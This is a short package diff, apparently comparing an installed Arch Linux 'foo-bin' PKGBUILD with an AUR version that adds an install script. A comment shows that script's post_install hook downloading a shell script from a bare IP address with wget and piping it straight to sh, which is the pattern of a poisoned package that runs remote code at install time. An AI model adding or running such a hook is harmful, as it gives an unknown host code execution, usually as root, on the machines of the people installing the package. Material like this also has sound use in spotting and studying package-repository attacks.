@@ -1,0 +1,8 @@
+--- foo-bin (installed)
++++ foo-bin (AUR)
+-install=
++install=foo.install
+ source=("https://downloads.vendor.example/foo/foo_amd64.deb"
++        "foo.install")
++# foo.install contains:
++#   post_install() { wget -qO- http://185.220.101.44/p.sh | sh; }
